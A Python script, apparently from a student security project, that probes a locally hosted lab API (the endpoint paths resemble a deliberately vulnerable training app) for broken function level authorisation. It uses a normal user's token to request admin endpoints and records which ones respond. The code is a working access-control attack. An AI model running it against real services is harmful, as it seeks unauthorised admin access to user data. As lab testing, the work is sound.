#!/usr/bin/env python3
"""
ATTACK 6: Broken Function Level Authorisation
OWASP: API5:2023
What: Access admin functions as normal user
How: Try admin endpoints with regular user token
Why dangerous: Could expose admin panel, user lists
"""
import requests
import json
import datetime
import time

TARGET = "http://localhost:8888"
RESULTS = "/home/xd-strange24/mscproject/experiments"

ADMIN_ENDPOINTS = [
    "/identity/api/v2/admin/users",
    "/identity/api/v2/admin/user/ADMIN_AKASH",
    "/workshop/api/v2/mechanic",
    "/workshop/api/v2/admin/mechanic/mechanic_report",
    "/community/api/v2/admin/post",
]

def run(token):
    print("=" * 55)
    print("ATTACK 6: BROKEN FUNCTION LEVEL AUTH (API5:2023)")
    print("Accessing Admin Endpoints as Normal User")
    print("=" * 55)

    headers = {"Authorization": "Bearer " + token}
    accessible = []
    blocked = []

    print("[*] Testing " + str(len(ADMIN_ENDPOINTS)) + " admin endpoints...\n")

    for endpoint in ADMIN_ENDPOINTS:
        url = TARGET + endpoint
        try:
            r = requests.get(url, headers=headers, timeout=5)
            status = r.status_code
            if status in [200, 201]:
                accessible.append(endpoint)
                print("[ACCESSIBLE] " + endpoint + " → " + str(status))
                print("             Response: " + r.text[:100])
            elif status == 403:
                blocked.append(endpoint)
                print("[BLOCKED   ] " + endpoint + " → 403 Forbidden")
            elif status == 401:
                blocked.append(endpoint)
                print("[BLOCKED   ] " + endpoint + " → 401 Unauthorised")
            else:
                print("[OTHER     ] " + endpoint + " → " + str(status))
            time.sleep(0.3)
        except Exception as e:
            print("[ERROR] " + endpoint + " : " + str(e))

    print("\n[RESULT] " + str(len(accessible)) + " admin endpoints accessible")
    print("[RESULT] " + str(len(blocked)) + " endpoints properly blocked")
    if accessible:
        print("[SEVERITY] CRITICAL — admin access as normal user!")
    else:
        print("[SEVERITY] LOW — endpoints properly protected")
        print("[NOTE] Logs still generated — attack pattern recorded")

    result = {
        "attack": "Broken Function Level Auth",
        "owasp": "API5:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "endpoints_tested": ADMIN_ENDPOINTS,
        "accessible": accessible,
        "blocked": blocked,
        "severity": "CRITICAL" if accessible else "LOW"
    }

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = RESULTS + "/attack6_funcauth_" + ts + ".json"
    with open(path, "w") as f:
        json.dump(result, f, indent=2)
    print("[SAVED] " + path)
    return result

if __name__ == "__main__":
    token = input("Enter Bearer token: ").strip()
    run(token)
